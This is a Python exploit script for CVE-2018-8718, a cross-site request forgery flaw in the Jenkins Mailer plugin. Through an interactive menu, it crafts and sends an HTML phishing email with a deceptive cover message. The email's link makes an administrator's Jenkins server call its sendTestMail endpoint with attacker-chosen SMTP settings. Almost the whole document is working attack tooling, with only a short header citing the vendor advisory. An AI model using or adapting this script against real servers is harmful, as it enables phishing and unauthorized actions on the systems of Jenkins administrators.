# Date : 2018-06-05
# Exploit Author : Kl3_GMjq6
# Vendor Homepage : https://jenkins.io/
# Software Link : [https://updates.jenkins.io/download/plugins/mailer/1.20/mailer.hpi]
# Version: [Below Version 1.20 (1.1 ~ 1.20) ]
# Ref: https://jenkins.io/security/advisory/2018-03-26/#SECURITY-774
# Tested on : Linux , Windows
# CVE : CVE-2018-8718
 
import email.message
import smtplib
import getpass
 
payload_list = [&#039;url&#039;,&#039;subject&#039;,&#039;cover_message&#039;,&#039;sender&#039;,&#039;reciver&#039;,&#039;test_email&#039;,&#039;smtp_server&#039;,&#039;l_id&#039;,&#039;l_pw&#039;]
table = {}
for i in payload_list :
    table.update({i:&#039;&#039;})
     
def send_mail() :
    msg = email.message.Message()
    msg[&#039;Subject&#039;] = table[&#039;subject&#039;]
    msg[&#039;From&#039;] = table[&#039;sender&#039;]
    msg[&#039;To&#039;] = table[&#039;reciver&#039;]
    msg.add_header(&#039;Content-Type&#039;,&#039;text/html&#039;)
    msg.set_payload(&#039;<a href="&#039;+table[&#039;url&#039;]+&#039;\
/descriptorByName/hudson.tasks.Mailer/sendTestMail?\
charset=UTF-8&sendTestMailTo=&#039;+table[&#039;test_email&#039;]+&#039;&adminAddress=&#039;+table[&#039;reciver&#039;]+&#039;\
&smtpPort=465&smtpServer=&#039;+table[&#039;smtp_server&#039;]+&#039;&smtpAuthPasswordSecret=&#039;+table[&#039;l_pw&#039;]+&#039;\
&useSMTPAuth=true&useSsl=true&smtpAuthUserName=&#039;+table[&#039;l_id&#039;]+&#039;">\
&#039;+table[&#039;cover_message&#039;]+&#039;</a>&#039;)
    s = smtplib.SMTP(table[&#039;smtp_server&#039;])
    s.starttls()
    s.login(table[&#039;l_id&#039;],
            table[&#039;l_pw&#039;])
    s.sendmail(msg[&#039;From&#039;], [msg[&#039;To&#039;]], msg.as_string())
 
def url_set() :
    url = str(input("Jenkins Server&#039;s URL(ex : http://vuln.jenkins.com) : "))
    if len(url) <= 0 :
        print ("    Can&#039;t Be Null!")
        url_set()
    elif url[0:4] != "http" :
        print ("    URL must start with &#039;http://&#039; ")
        url_set()
    else : table[&#039;url&#039;] = url
 
def subject_set() :
    subject = str(input ("SUBJECT [Default : Look! Warning with your Jenkins] : "))
    if len(subject) <= 0 :
        subject = "Look! Waning with your Jenkins"
    table[&#039;subject&#039;] = subject
 
def cover_message() :
    cover_message = str(input ("Cover Message [Default : Here is your Vulnable!] : "))
    if len(cover_message) <= 0 :
        cover_message = "Here is your Vulnable!"
    table[&#039;cover_message&#039;] = cover_message
     
def sender() :
    sender = str(input ("Attacker E-mail(ex : attacker@abcd.com) : "))
    if len(sender) <= 0 :
        print ("    Can&#039;t Be Null!")
        sender()
    else : table[&#039;sender&#039;] = sender
 
def reciver() :
    reciver = str(input ("Admin&#039;s E-mail(ex : admin@abcd.com) : "))
    if len(reciver) <= 0 :
        print ("    Can&#039;t Be Null!")
        reciver()
    else : table[&#039;reciver&#039;] = reciver
 
def test_email() :
    test_email = str(input ("Tester E-mail(ex : tester@abcd.com) : "))
    if len(test_email) <= 0 :
        print ("    Can&#039;t Be Null!")
        test_email()
    table[&#039;test_email&#039;]  = test_email
 
def smtp_server() :
    smtp_server = str(input ("SMTP_Server [Default : smtp.gmail.com] : "))
    if len(smtp_server) <= 0 :
        smtp_server = "smtp.gmail.com"
    table[&#039;smtp_server&#039;] = smtp_server
 
def l_id() :
    l_id = str(input ("Your SMTP_Server ID  : "))
    if len(l_id) <= 0 :
        print ("    Can&#039;t Be Null!")
        l_id()
    table[&#039;l_id&#039;] = l_id
 
def l_pw() :
    l_pw = str(getpass.getpass("Your SMTP_Server PW : "))
    if len(l_pw) <= 0 :
        print ("    Can&#039;t Be Null!")
        l_pw()
    table[&#039;l_pw&#039;] = l_pw
 
def set_all () :
    url_set()
    subject_set()
    cover_message()
    sender()
    reciver()
    test_email()
    smtp_server()
    l_id()
    l_pw()
    print ("Setting Complit! Use &#039;show&#039; to check options")
 
set_help = {
    &#039;all&#039;:"Set all payload",
    &#039;help&#039;:"Show set commend&#039;s help",
    &#039;url_set&#039;:"Set only &#039;url_set&#039; payload",
    &#039;subject_set&#039;:"Set only &#039;url_set&#039; payload",
    &#039;cover_message&#039;:"Set only &#039;cover_message&#039; payload",
    &#039;sender&#039;:"Set only &#039;sender&#039; payload",
    &#039;reciver&#039;:"Set only &#039;reciver&#039; payload",
    &#039;test_email&#039;:"Set only &#039;test_email&#039; payload",
    &#039;smtp_server&#039;:"Set only &#039;smtp_server&#039; payload",
    &#039;l_id&#039;:"Set only &#039;l_id&#039; payload",
    &#039;l_pw&#039;:"Set only &#039;l_pw&#039; payload",
    }
 
def set_select (a) :
    if a=="all" : set_all() 
    elif a=="url_set" : url_set()
    elif a=="subject_set" : subject_set()
    elif a=="cover_message" : cover_message()
    elif a=="sender" : sender()
    elif a=="reciver" : reciver()
    elif a=="test_email" : test_email()
    elif a=="smtp_server" : smtp_server()
    elif a=="l_id" : l_id()
    elif a=="l_pw" : l_pw()
    elif a=="help" :
        for i in set_help :
            print ("    -%-20s %-s" %(i,set_help[i]))
    print (&#039;&#039;)
 
 
 
while True :
    direct = str(input ("CVE-2018-8718 >> ")).lower()
     
    if direct == "help" :
        print ("""\
    %-10s Show this help menu.          
    %-10s [-all / -help / -url_set / -subject_set / .... ]
    %-10s Set the Payload
    %-10s [-all] Show Current Setting.
    %-10s Send CSRF use current setting.
    """ %("help","set","","show","send"))
         
    elif direct[0:3] == "set" :
        if &#039; -&#039; not in direct :
            if direct == "set" :
                set_option = ["help"]
            else :
                print ("    Option error \n")
        else :
            set_option = direct.split(&#039; -&#039;)[1:]
        okay = 1
 
        if len(set_option) == 1 :
            if set_option[0] not in set_help :
                print ("    Option error \n")
            else :
                set_select(set_option[0])
        elif len(set_option) >= 2 :
            for i in set_option :
                if i in [&#039;help&#039;, &#039;all&#039;] :
                    print ("     *Option [-help / -all] cannot be use with another options \n")
                    okay = 0
                    break
            for i in set_option :
                if i not in set_help :
                    print ("    Option error \n")
                    okay = 0
                    break
            if okay == 1 :
                for i in set_option :
                    set_select(i)
                     
    elif direct[:4] == "show" :
        if " -" not in direct :
 
            if direct == "show" :
                for i in table :
                    if i != "l_pw" :
                        print ("    %-20s %s" %(i,table[i]))
                print ("    If you want to see l_pw... add [-all] option")
                print ("")
            else :
                print ("    Option error \n")
        else :
            show_option = direct.split(" -")[1:]
            if (len(show_option) == 1 and show_option[0] == &#039;all&#039;) :
                for i in table :
                    print ("      %-20s %s" %(i,table[i]))
                print ()
            else :
                print ("    Option error \n")
         
    elif direct == "send" :
        print ("    Sending CSRF Mail.....")
        try :
            send_mail()
            print ("    Succed!!\n")
        except :
            print ("    Fail....")
             
    elif direct == "exit" :
        break
     
    else :
        print ("    Usage : help\n")

